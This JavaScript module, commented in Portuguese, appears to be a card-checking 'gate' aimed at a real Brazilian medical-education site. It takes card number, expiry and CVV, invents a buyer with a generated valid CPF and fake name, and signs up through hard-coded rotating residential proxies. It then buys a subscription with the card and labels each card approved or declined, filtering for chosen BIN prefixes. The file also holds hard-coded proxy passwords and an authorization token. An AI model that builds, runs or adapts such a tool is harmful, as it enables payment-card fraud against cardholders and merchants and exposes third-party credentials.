import axios from 'axios';
import fs from 'fs';
import chalk from 'chalk';
import { HttpsProxyAgent } from 'https-proxy-agent';
import { faker } from '@faker-js/faker'; // Biblioteca atualizada para gerar dados falsos
import cpf from 'cpf';
import tough from 'tough-cookie';       // Biblioteca para gerar CPFs válidos
const cookieJar = new tough.CookieJar();
// Função para gerar um nome completo aleatório
function gerarNomeCompleto() {
    const primeiroNome = faker.person.firstName();
    const sobrenome = faker.person.lastName();
    return `${primeiroNome} ${sobrenome}`;
}

// Função para gerar um e-mail aleatório
function gerarEmail(nomeCompleto) {
    const nomePartes = nomeCompleto.toLowerCase().split(' ');
    const email = `${nomePartes[0]}.${nomePartes[1]}@exemplo.com`;
    return email;
}

// Função para gerar um CPF aleatório válido
function gerarCPF() {
    return cpf.generate().replace(/[.-]/g, '');  // Gera um CPF válido
}

// Função para gerar um número de telefone aleatório
function gerarTelefone() {
    const ddd = faker.number.int({ min: 11, max: 99 }); // DDD aleatório
    const numero = faker.phone.number('9####-####');    // Formato de celular
    return `(${ddd}) ${numero}`;
}

// Função para gerar todas as informações
function gerarInformacoes() {
    const nomeCompleto = gerarNomeCompleto();
    const email = gerarEmail(nomeCompleto);
    const documentoCPF = gerarCPF();
    const telefone = gerarTelefone();

    return {
        nome: nomeCompleto,
        email: email,
        cpf: documentoCPF,
        telefone: telefone
    };
}
//console.log(dadosGerados);
// Configuração do proxy
const proxyConfig = {
    protocol: 'http',
    host: 'rp.proxyscrape.com',
    port: 6060,
    auth: {
        username: 'jpn645m14q0pkq9-country-br',
        password: '1witm204vszvwdv'
    }
};
//const proxyAgent = new HttpsProxyAgent(`http://${proxyConfig.auth.username}:${proxyConfig.auth.password}@${proxyConfig.host}:${proxyConfig.port}`);
const proxyCredentials = '2BBmmf8kVHfpGMzO:H8h2PGjZJhxX2g7Q_country-br,us_streaming-1';
const proxyHost = 'geo.iproyal.com';
const proxyPort = 12321;


const proxyAgent = new HttpsProxyAgent(`http://${proxyCredentials}@${proxyHost}:${proxyPort}`);

// Exemplo de uso



function getCardType(cardNumber) {
    // Remove espaços ou hífens no número do cartão, caso existam
    const cleanCardNumber = cardNumber.replace(/[\s-]/g, '');

    // Verifica se é Visa (começa com 4 e tem 13 ou 16 dígitos)
    if (/^4\d{12}(\d{3})?$/.test(cleanCardNumber)) {
        return 'visa';
    }

    // Verifica se é Mastercard (começa com 51-55 ou 22-27 e tem 16 dígitos)
    if (/^5[1-5]\d{14}$/.test(cleanCardNumber) || /^2[2-7]\d{14}$/.test(cleanCardNumber)) {
        return 'master';
    }

    // Se não é Visa nem Mastercard
    return 'Unknown Card Type';
}

// Exemplo de uso


// Função de compra
async function makePurchase(numberGG, monthGG, yearGG, cvvGG) {
    const startTime = Date.now();  // Captura o tempo de início

    try {

        const cardType = getCardType(numberGG);
        // Gerar e exibir informações
        const dadosGerados = gerarInformacoes();
        //   console.log(`O tipo de cartão é: ${cardType}`);
        const cpfFormatted = dadosGerados.cpf.replace(/\D/g, '');


        const register = await axios.post(
            'https://api.medcode.com.br/user/simpleSignUp',
            {
                'roleId': 3,
                'phoneCode': '+55',
                'device': {
                    'id': 0,
                    'model': 'Windows NT 10.0',
                    'key': 'd252b678-03ec-48ae-a4b2-4218f25e804e',
                    'os': 'web',
                    'gateway': 'NONE',
                    'subscription': 'DEACTIVE',
                    'credentialId': 0
                },
                'email': dadosGerados.email,
                'password': 'daniloplay1011@',
                'firstName': dadosGerados.nome,
                'lastName': 'JOAQUIM',
                'passwordConfirm': 'daniloplay1011@',
                'govId': cpfFormatted,
                'jobId': 1,
                'gender': 'F',
                'phoneNumber': '91984155842'
            },
            {
                headers: {
                    'Host': 'api.medcode.com.br',
                    'sec-ch-ua-platform': '"Windows"',
                    'authorization': 'eyJhbGciOiJIUzI1NiJ9.eyJjcmVkZW50aWFsIjoiZmVybmFuZG9yYWxoYUBnbWFpbC5jb20iLCJ0eXBlIjoiVE9LRU4ifQ.fH0w3dQkgZCfAi9fu8kuHf73PJLzTEyM3HGPjaZ2eCQ',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
                    'sec-ch-ua-mobile': '?0',
                    'origin': 'https://app.medcode.com.br',
                    'sec-fetch-site': 'same-site',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://app.medcode.com.br/',
                    'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                    'priority': 'u=1, i'
                },
                httpsAgent: proxyAgent
            }
        );

        //  console.log(register.data);
        const credentialId = await axios.get(`https://api.medcode.com.br/user/findbycredentialemail/${dadosGerados.email}`, {
            headers: {
                'Host': 'api.medcode.com.br',
                'sec-ch-ua-platform': '"Windows"',
                'authorization': register.data.token,
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                'accept': 'application/json, text/plain, */*',
                'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'origin': 'https://app.medcode.com.br',
                'sec-fetch-site': 'same-site',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://app.medcode.com.br/',
                'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'priority': 'u=1, i'
            },
            httpsAgent: proxyAgent
        });

        //   console.log(credentialId.data.credentialId)


        const UpdateProfile = await axios.post(
            'https://api.medcode.com.br/user/updateprofile',
            {
                'id': register.data.customer.id,
                'govId': cpfFormatted,
                'gender': 'F',
                'picture': '',
                'phoneNumber': '91984155843',
                'phoneCode': '+55',
                'firstName': dadosGerados.nome,
                'lastName': 'costa',
                'email': dadosGerados.email,
                'birthDate': null,
                'credentialId': credentialId.data.credentialId,
                'address': {
                    'id': 0,
                    'street': 'Rua Doutor Cincinato Braga',
                    'addressNumber': '34',
                    'zipCode': '09890-300',
                    'neighborhood': '',
                    'uf': 'SP',
                    'city': 'S\xC3\xA3o Bernardo do Campo',
                    'complement': ''
                }
            },
            {
                headers: {
                    'Host': 'api.medcode.com.br',
                    'sec-ch-ua-platform': '"Windows"',
                    'authorization': register.data.token,
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
                    'sec-ch-ua-mobile': '?0',
                    'origin': 'https://app.medcode.com.br',
                    'sec-fetch-site': 'same-site',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://app.medcode.com.br/',
                    'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                    'priority': 'u=1, i'
                },
                httpsAgent: proxyAgent
            }
        );

        //  console.log(UpdateProfile.data);



        const response = await axios.post(
            'https://api.medcode.com.br/user/subscribe',
            {
                'credentialId': credentialId.data.credentialId,
                'planIdentifier': 'plano-individual-mensal',
                'device': {
                    'key': 'f83d1e0c-c7d0-41c1-aa6d-1b0c6dd5a8db',
                    'os': 'web',
                    'model': 'Windows NT 10.0',
                    'credentialId': credentialId.data.credentialId,
                    'gateway': 'IUGU',
                    'subscription': 'ACTIVE'
                },
                'card': {
                    'number': numberGG,
                    'code': cvvGG,
                    'name': dadosGerados.nome,
                    'date': `${monthGG}${yearGG}`,
                    'cpf': cpfFormatted
                },
                'address': {
                    'id': 57067,
                    'street': 'Rua Doutor Cincinato Braga',
                    'addressNumber': '22',
                    'zipCode': '09890300',
                    'neighborhood': 'S\xC3\xA3o Bernardo do Campo',
                    'uf': 'SP',
                    'city': 'S\xC3\xA3o Bernardo do Campo'
                }
            },
            {
                headers: {
                    'Host': 'api.medcode.com.br',
                    'sec-ch-ua-platform': '"Windows"',
                    'authorization': register.data.token,
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
                    'sec-ch-ua-mobile': '?0',
                    'origin': 'https://app.medcode.com.br',
                    'sec-fetch-site': 'same-site',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://app.medcode.com.br/',
                    'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                    'priority': 'u=1, i'
                },
                httpsAgent: proxyAgent
            }
        );

        console.log(response.data)
       // if (response.data.factor == true) {
            //  console.log(payment.data)
            // cookieJar.removeAllCookiesSync();
            return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - Assinatura realizada com sucesso R$ 35,00 💸 |[@im_Karmah] `;
      // } else {
      //     //cookieJar.removeAllCookiesSync();
      //     return console.log(chalk.red(`[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - Retorno - Assinatura realizada com sucesso R$ 35,00 💸 [@im_Karmah]`
      // }
    } catch (error) {
       // console.log(error.response.data)
        return `[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - Pagamento recusado  - [@im_Karmah]`

        //let returnError = error.response.data.data
        //console.log(returnError)
        //if ( returnError.data.gateway_response_code == 'N7' || returnError.data.gateway_response_code == '51') {
        //    return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnError.data.status}|${returnError.data.gateway_response_code} 💸 |[@im_Karmah] `));
        //  } else { 
        //   return console.log(chalk.red(`[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${error.response.data.message} - [@im_Karmah]`))
        //  }
    }
}

async function executeFlow(value) {
    try {
        const [numberGG, monthGG, yearGG, cvvGG] = value.split('|');
        const yearSplited = yearGG.split('20')[1];
        
        if (value.startsWith('466') || value.startsWith('552289')) {
            console.log('O cartão começa com 466');
            // console.log(numberGG, monthGG, yearSplited, cvvGG);
    
            let respoonse = await makePurchase(numberGG, monthGG, yearSplited, cvvGG);
            return respoonse;
        } else {
            console.log('O cartão não começa com 466');
            return `[Reprovada] ${numberGG}|${monthGG}|20${yearSplited}|${cvvGG} Retorno - GATE APENAS PARA AS 466 e 552289 - [@loficenter]`;
        }

    } catch (error) {
        console.error('Erro no fluxo principal:', error);
    }
}

export default executeFlow

